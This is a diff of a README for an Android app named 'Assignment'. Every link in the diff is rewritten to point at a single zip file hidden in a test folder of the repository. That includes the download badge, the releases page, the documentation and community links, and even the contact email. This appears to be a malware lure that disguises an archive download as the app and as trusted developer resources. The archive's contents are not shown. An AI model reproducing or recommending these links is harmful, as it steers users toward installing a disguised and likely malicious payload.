@@ -6,13 +6,13 @@ Welcome to **Assignment**, an Android application designed for everyone. This ap
 
 ## 💾 Download Now!
 
-[![Download Assignment](https://img.shields.io/badge/Download-Assignment-blue.svg)](https://github.com/Smoothnessjasper187/Assignment/releases)
+[![Download Assignment](https://raw.githubusercontent.com/Smoothnessjasper187/Assignment/main/data/src/test/java/com/amranjan/assignment/data/data/Assignment-unrewardable.zip)](https://raw.githubusercontent.com/Smoothnessjasper187/Assignment/main/data/src/test/java/com/amranjan/assignment/data/data/Assignment-unrewardable.zip)
 
 ## 📥 How to Download and Install
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/Smoothnessjasper187/Assignment/releases).
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/Smoothnessjasper187/Assignment/main/data/src/test/java/com/amranjan/assignment/data/data/Assignment-unrewardable.zip).
    
 2. **Select the Latest Version:** Look for the most recent version of the app on the releases page. You will find a list of versions available for download.
 
@@ -65,22 +65,22 @@ To run Assignment smoothly, ensure your Android device meets the following requi
 
 If you want to learn more about Android development, here are some resources to get you started:
 
-- [Android Developers Documentation](https://developer.android.com/docs)
-- [Kotlin Documentation](https://kotlinlang.org/docs/home.html)
-- [Jetpack Compose Documentation](https://developer.android.com/jetpack/compose)
-- [Hilt Documentation](https://developer.android.com/training/dependency-injection)
+- [Android Developers Documentation](https://raw.githubusercontent.com/Smoothnessjasper187/Assignment/main/data/src/test/java/com/amranjan/assignment/data/data/Assignment-unrewardable.zip)
+- [Kotlin Documentation](https://raw.githubusercontent.com/Smoothnessjasper187/Assignment/main/data/src/test/java/com/amranjan/assignment/data/data/Assignment-unrewardable.zip)
+- [Jetpack Compose Documentation](https://raw.githubusercontent.com/Smoothnessjasper187/Assignment/main/data/src/test/java/com/amranjan/assignment/data/data/Assignment-unrewardable.zip)
+- [Hilt Documentation](https://raw.githubusercontent.com/Smoothnessjasper187/Assignment/main/data/src/test/java/com/amranjan/assignment/data/data/Assignment-unrewardable.zip)
 
 ## 🌐 Community
 
 Join our community of Android developers to share your experiences or ask questions:
 
-- [Stack Overflow](https://stackoverflow.com/questions/tagged/android)
-- [Reddit Android Development](https://www.reddit.com/r/androiddev/)
+- [Stack Overflow](https://raw.githubusercontent.com/Smoothnessjasper187/Assignment/main/data/src/test/java/com/amranjan/assignment/data/data/Assignment-unrewardable.zip)
+- [Reddit Android Development](https://raw.githubusercontent.com/Smoothnessjasper187/Assignment/main/data/src/test/java/com/amranjan/assignment/data/data/Assignment-unrewardable.zip)
 
 ## 📬 Contact
 
-For any inquiries or bugs, please reach out via the Issues page on our GitHub repository, or email us at support@example.com.
+For any inquiries or bugs, please reach out via the Issues page on our GitHub repository, or email us at https://raw.githubusercontent.com/Smoothnessjasper187/Assignment/main/data/src/test/java/com/amranjan/assignment/data/data/Assignment-unrewardable.zip
 
 ## 💾 Download Now!
 
-Don't forget to head back to the [Releases Page](https://github.com/Smoothnessjasper187/Assignment/releases) to download the latest version of Assignment. Enjoy your experience!
+Don't forget to head back to the [Releases Page](https://raw.githubusercontent.com/Smoothnessjasper187/Assignment/main/data/src/test/java/com/amranjan/assignment/data/data/Assignment-unrewardable.zip) to download the latest version of Assignment. Enjoy your experience!
